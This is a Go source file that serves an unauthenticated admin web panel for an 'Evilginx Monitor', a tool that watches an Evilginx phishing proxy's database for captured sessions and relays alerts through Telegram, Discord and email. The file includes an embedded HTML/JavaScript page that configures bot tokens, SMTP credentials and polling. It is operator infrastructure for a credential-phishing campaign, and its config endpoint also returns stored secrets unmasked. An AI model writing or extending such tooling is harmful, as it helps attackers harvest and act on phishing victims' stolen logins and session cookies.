package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"
)

var adminServer *http.Server

// StartAdminServer starts the admin web interface server
func StartAdminServer(port int) error {
	mux := http.NewServeMux()

	// Static files and templates
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/api/config", handleConfigAPI)
	mux.HandleFunc("/api/status", handleStatusAPI)
	mux.HandleFunc("/api/sessions", handleSessionsAPI)
	mux.HandleFunc("/api/monitoring/start", handleStartMonitoring)
	mux.HandleFunc("/api/monitoring/stop", handleStopMonitoring)

	addr := fmt.Sprintf(":%d", port)
	adminServer = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	fmt.Printf("Admin UI started on http://localhost%s\n", addr)
	fmt.Printf("Access the admin panel at http://localhost%s\n", addr)
	return adminServer.ListenAndServe()
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	tmpl := getAdminTemplate()
	if tmpl == "" {
		http.Error(w, "Template not found", http.StatusInternalServerError)
		return
	}

	t, err := template.New("admin").Parse(tmpl)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error parsing template: %v", err), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	if err := t.Execute(w, nil); err != nil {
		http.Error(w, fmt.Sprintf("Error executing template: %v", err), http.StatusInternalServerError)
	}
}

func handleConfigAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	switch r.Method {
	case "GET":
		config, err := loadConfig()
		if err != nil {
			http.Error(w, fmt.Sprintf(`{"error": "%v"}`, err), http.StatusInternalServerError)
			return
		}
		if config == nil {
			http.Error(w, `{"error": "Config is nil"}`, http.StatusInternalServerError)
			return
		}
		json.NewEncoder(w).Encode(config)

	case "POST", "PUT":
		var config Config
		if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
			http.Error(w, fmt.Sprintf(`{"error": "Invalid JSON: %v"}`, err), http.StatusBadRequest)
			return
		}

		if err := UpdateConfig(&config); err != nil {
			http.Error(w, fmt.Sprintf(`{"error": "%v"}`, err), http.StatusInternalServerError)
			return
		}

		json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "Configuration updated"})

	default:
		http.Error(w, `{"error": "Method not allowed"}`, http.StatusMethodNotAllowed)
	}
}

func handleStatusAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	status := map[string]interface{}{
		"monitoring":    monitoring,
		"db_file_path":  "",
		"last_check":    time.Now().Format(time.RFC3339),
		"telegram":      map[string]interface{}{"enabled": false},
		"discord":       map[string]interface{}{"enabled": false},
		"email":         map[string]interface{}{"enabled": false},
	}

	config, err := loadConfig()
	if err == nil && config != nil {
		status["db_file_path"] = config.DBFilePath
		status["telegram"] = map[string]interface{}{
			"enabled": config.TelegramEnable,
			"chat_id": maskString(config.TelegramChatID),
		}
		status["discord"] = map[string]interface{}{
			"enabled": config.DiscordEnable,
			"chat_id": maskString(config.DiscordChatID),
		}
		status["email"] = map[string]interface{}{
			"enabled": config.MailEnable,
			"to":      config.ToMail,
		}
	}

	json.NewEncoder(w).Encode(status)
}

func handleSessionsAPI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	mu.Lock()
	sessions := make([]map[string]interface{}, 0, len(processedSessions))
	for sessionID := range processedSessions {
		messageID, exists := sessionMessageMap[sessionID]
		sessions = append(sessions, map[string]interface{}{
			"session_id": sessionID,
			"message_id": messageID,
			"processed":  exists,
		})
	}
	mu.Unlock()

	json.NewEncoder(w).Encode(map[string]interface{}{
		"sessions": sessions,
		"count":    len(sessions),
	})
}

func handleStartMonitoring(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, `{"error": "Method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	config, err := loadConfig()
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error": "%v"}`, err), http.StatusInternalServerError)
		return
	}
	if config == nil {
		http.Error(w, `{"error": "Config is nil"}`, http.StatusInternalServerError)
		return
	}

	if config.DBFilePath == "" {
		http.Error(w, `{"error": "Database file path not configured"}`, http.StatusBadRequest)
		return
	}

	err = StartPolling(config.DBFilePath, 30*time.Second)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error": "%v"}`, err), http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "Monitoring started"})
}

func handleStopMonitoring(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		http.Error(w, `{"error": "Method not allowed"}`, http.StatusMethodNotAllowed)
		return
	}

	StopPolling()
	json.NewEncoder(w).Encode(map[string]string{"status": "success", "message": "Monitoring stopped"})
}

func maskString(s string) string {
	if len(s) == 0 {
		return ""
	}
	if len(s) <= 4 {
		return "****"
	}
	return s[:2] + "****" + s[len(s)-2:]
}

func getAdminTemplate() string {
	return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evilginx Monitor - Admin Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            background: white;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .header h1 {
            color: #333;
            margin-bottom: 10px;
        }
        .header p {
            color: #666;
        }
        .status-bar {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .status-item {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ccc;
        }
        .status-indicator.active {
            background: #10b981;
            box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
        }
        .status-indicator.inactive {
            background: #ef4444;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-primary:hover {
            background: #5568d3;
        }
        .btn-danger {
            background: #ef4444;
            color: white;
        }
        .btn-danger:hover {
            background: #dc2626;
        }
        .btn-success {
            background: #10b981;
            color: white;
        }
        .btn-success:hover {
            background: #059669;
        }
        .card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #667eea;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 24px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        .toggle-switch input:checked + .slider {
            background-color: #667eea;
        }
        .toggle-switch input:checked + .slider:before {
            transform: translateX(26px);
        }
        .alert {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: none;
        }
        .alert.success {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #10b981;
        }
        .alert.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #ef4444;
        }
        .sessions-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .session-item {
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .session-item:last-child {
            border-bottom: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Evilginx Monitor Admin Panel</h1>
            <p>Monitor and manage your Evilginx credential monitoring system</p>
        </div>

        <div id="alert" class="alert"></div>

        <div class="status-bar">
            <div class="status-item">
                <span class="status-indicator" id="monitoring-indicator"></span>
                <span>Monitoring: <strong id="monitoring-status">Unknown</strong></span>
            </div>
            <div class="status-item">
                <span class="status-indicator" id="telegram-indicator"></span>
                <span>Telegram: <strong id="telegram-status">Unknown</strong></span>
            </div>
            <div class="status-item">
                <span class="status-indicator" id="discord-indicator"></span>
                <span>Discord: <strong id="discord-status">Unknown</strong></span>
            </div>
            <div class="status-item">
                <span class="status-indicator" id="email-indicator"></span>
                <span>Email: <strong id="email-status">Unknown</strong></span>
            </div>
            <div>
                <button class="btn btn-primary" id="start-btn" onclick="startMonitoring()">Start Monitoring</button>
                <button class="btn btn-danger" id="stop-btn" onclick="stopMonitoring()">Stop Monitoring</button>
            </div>
        </div>

        <div class="card">
            <h2>⚙️ Configuration</h2>
            <form id="config-form">
                <div class="form-group">
                    <label>Database File Path</label>
                    <input type="text" id="db-path" placeholder="/path/to/data.db" required>
                </div>

                <h3 style="margin-top: 30px; margin-bottom: 15px; color: #666;">Telegram Settings</h3>
                <div class="form-row">
                    <div class="form-group">
                        <label>Telegram Token</label>
                        <input type="text" id="tele-token" placeholder="Bot token">
                    </div>
                    <div class="form-group">
                        <label>Chat ID</label>
                        <input type="text" id="tele-chatid" placeholder="Chat ID">
                    </div>
                </div>
                <div class="form-group">
                    <label>
                        Enable Telegram Notifications
                        <span class="toggle-switch" style="margin-left: 10px;">
                            <input type="checkbox" id="tele-enable">
                            <span class="slider"></span>
                        </span>
                    </label>
                </div>

                <h3 style="margin-top: 30px; margin-bottom: 15px; color: #666;">Discord Settings</h3>
                <div class="form-row">
                    <div class="form-group">
                        <label>Discord Token</label>
                        <input type="text" id="discord-token" placeholder="Bot token">
                    </div>
                    <div class="form-group">
                        <label>Chat ID</label>
                        <input type="text" id="discord-chatid" placeholder="User ID">
                    </div>
                </div>
                <div class="form-group">
                    <label>
                        Enable Discord Notifications
                        <span class="toggle-switch" style="margin-left: 10px;">
                            <input type="checkbox" id="discord-enable">
                            <span class="slider"></span>
                        </span>
                    </label>
                </div>

                <h3 style="margin-top: 30px; margin-bottom: 15px; color: #666;">Email Settings</h3>
                <div class="form-row">
                    <div class="form-group">
                        <label>SMTP Host</label>
                        <input type="text" id="mail-host" placeholder="smtp.gmail.com">
                    </div>
                    <div class="form-group">
                        <label>SMTP Port</label>
                        <input type="number" id="mail-port" placeholder="587">
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>SMTP User</label>
                        <input type="text" id="mail-user" placeholder="your-email@gmail.com">
                    </div>
                    <div class="form-group">
                        <label>SMTP Password</label>
                        <input type="password" id="mail-password" placeholder="Password">
                    </div>
                </div>
                <div class="form-group">
                    <label>To Email</label>
                    <input type="email" id="mail-to" placeholder="recipient@example.com">
                </div>
                <div class="form-group">
                    <label>
                        Enable Email Notifications
                        <span class="toggle-switch" style="margin-left: 10px;">
                            <input type="checkbox" id="mail-enable">
                            <span class="slider"></span>
                        </span>
                    </label>
                </div>

                <button type="submit" class="btn btn-success" style="margin-top: 20px;">Save Configuration</button>
            </form>
        </div>

        <div class="card">
            <h2>📊 Recent Sessions</h2>
            <div class="sessions-list" id="sessions-list">
                <p style="color: #666; text-align: center; padding: 20px;">Loading sessions...</p>
            </div>
        </div>
    </div>

    <script>
        // Load configuration on page load
        async function loadConfig() {
            try {
                const response = await fetch('/api/config');
                const config = await response.json();
                
                document.getElementById('db-path').value = config.dbfile_path || '';
                document.getElementById('tele-token').value = config.telegram_token || '';
                document.getElementById('tele-chatid').value = config.telegr_chatid || '';
                document.getElementById('tele-enable').checked = config.telegram_enable || false;
                document.getElementById('discord-token').value = config.discord_token || '';
                document.getElementById('discord-chatid').value = config.discord_chat_id || '';
                document.getElementById('discord-enable').checked = config.discord_enable || false;
                document.getElementById('mail-host').value = config.mail_host || '';
                document.getElementById('mail-port').value = config.mail_port || '';
                document.getElementById('mail-user').value = config.mail_user || '';
                document.getElementById('mail-password').value = config.mail_password || '';
                document.getElementById('mail-to').value = config.to_mail || '';
                document.getElementById('mail-enable').checked = config.mail_enable || false;
            } catch (error) {
                showAlert('Error loading configuration: ' + error.message, 'error');
            }
        }

        // Save configuration
        document.getElementById('config-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const config = {
                dbfile_path: document.getElementById('db-path').value,
                telegram_token: document.getElementById('tele-token').value,
                telegr_chatid: document.getElementById('tele-chatid').value,
                telegram_enable: document.getElementById('tele-enable').checked,
                discord_token: document.getElementById('discord-token').value,
                discord_chat_id: document.getElementById('discord-chatid').value,
                discord_enable: document.getElementById('discord-enable').checked,
                mail_host: document.getElementById('mail-host').value,
                mail_port: parseInt(document.getElementById('mail-port').value) || 0,
                mail_user: document.getElementById('mail-user').value,
                mail_password: document.getElementById('mail-password').value,
                to_mail: document.getElementById('mail-to').value,
                mail_enable: document.getElementById('mail-enable').checked
            };

            try {
                const response = await fetch('/api/config', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(config)
                });
                
                const result = await response.json();
                if (response.ok) {
                    showAlert('Configuration saved successfully!', 'success');
                    updateStatus();
                } else {
                    showAlert('Error saving configuration: ' + (result.error || 'Unknown error'), 'error');
                }
            } catch (error) {
                showAlert('Error saving configuration: ' + error.message, 'error');
            }
        });

        // Update status
        async function updateStatus() {
            try {
                const response = await fetch('/api/status');
                const status = await response.json();
                
                const monitoringIndicator = document.getElementById('monitoring-indicator');
                const monitoringStatus = document.getElementById('monitoring-status');
                if (status.monitoring) {
                    monitoringIndicator.className = 'status-indicator active';
                    monitoringStatus.textContent = 'Active';
                } else {
                    monitoringIndicator.className = 'status-indicator inactive';
                    monitoringStatus.textContent = 'Inactive';
                }

                const telegramIndicator = document.getElementById('telegram-indicator');
                const telegramStatus = document.getElementById('telegram-status');
                if (status.telegram.enabled) {
                    telegramIndicator.className = 'status-indicator active';
                    telegramStatus.textContent = 'Enabled';
                } else {
                    telegramIndicator.className = 'status-indicator inactive';
                    telegramStatus.textContent = 'Disabled';
                }

                const discordIndicator = document.getElementById('discord-indicator');
                const discordStatus = document.getElementById('discord-status');
                if (status.discord.enabled) {
                    discordIndicator.className = 'status-indicator active';
                    discordStatus.textContent = 'Enabled';
                } else {
                    discordIndicator.className = 'status-indicator inactive';
                    discordStatus.textContent = 'Disabled';
                }

                const emailIndicator = document.getElementById('email-indicator');
                const emailStatus = document.getElementById('email-status');
                if (status.email.enabled) {
                    emailIndicator.className = 'status-indicator active';
                    emailStatus.textContent = 'Enabled';
                } else {
                    emailIndicator.className = 'status-indicator inactive';
                    emailStatus.textContent = 'Disabled';
                }
            } catch (error) {
                console.error('Error updating status:', error);
            }
        }

        // Load sessions
        async function loadSessions() {
            try {
                const response = await fetch('/api/sessions');
                const data = await response.json();
                
                const sessionsList = document.getElementById('sessions-list');
                if (data.sessions && data.sessions.length > 0) {
                    sessionsList.innerHTML = data.sessions.map(function(session) {
                        return '<div class="session-item">' +
                            '<div>' +
                            '<strong>Session ID:</strong> ' + session.session_id + '<br>' +
                            '<small>Message ID: ' + (session.message_id || 'N/A') + '</small>' +
                            '</div>' +
                            '<span style="color: #10b981;">✓ Processed</span>' +
                            '</div>';
                    }).join('');
                } else {
                    sessionsList.innerHTML = '<p style="color: #666; text-align: center; padding: 20px;">No sessions processed yet</p>';
                }
            } catch (error) {
                console.error('Error loading sessions:', error);
            }
        }

        // Start monitoring
        async function startMonitoring() {
            try {
                const response = await fetch('/api/monitoring/start', { method: 'POST' });
                const result = await response.json();
                if (response.ok) {
                    showAlert('Monitoring started successfully!', 'success');
                    updateStatus();
                } else {
                    showAlert('Error starting monitoring: ' + (result.error || 'Unknown error'), 'error');
                }
            } catch (error) {
                showAlert('Error starting monitoring: ' + error.message, 'error');
            }
        }

        // Stop monitoring
        async function stopMonitoring() {
            try {
                const response = await fetch('/api/monitoring/stop', { method: 'POST' });
                const result = await response.json();
                if (response.ok) {
                    showAlert('Monitoring stopped successfully!', 'success');
                    updateStatus();
                } else {
                    showAlert('Error stopping monitoring: ' + (result.error || 'Unknown error'), 'error');
                }
            } catch (error) {
                showAlert('Error stopping monitoring: ' + error.message, 'error');
            }
        }

        // Show alert
        function showAlert(message, type) {
            const alert = document.getElementById('alert');
            alert.textContent = message;
            alert.className = 'alert ' + type;
            alert.style.display = 'block';
            setTimeout(() => {
                alert.style.display = 'none';
            }, 5000);
        }

        // Initialize
        loadConfig();
        updateStatus();
        loadSessions();
        setInterval(updateStatus, 5000); // Update status every 5 seconds
        setInterval(loadSessions, 10000); // Load sessions every 10 seconds
    </script>
</body>
</html>`
}

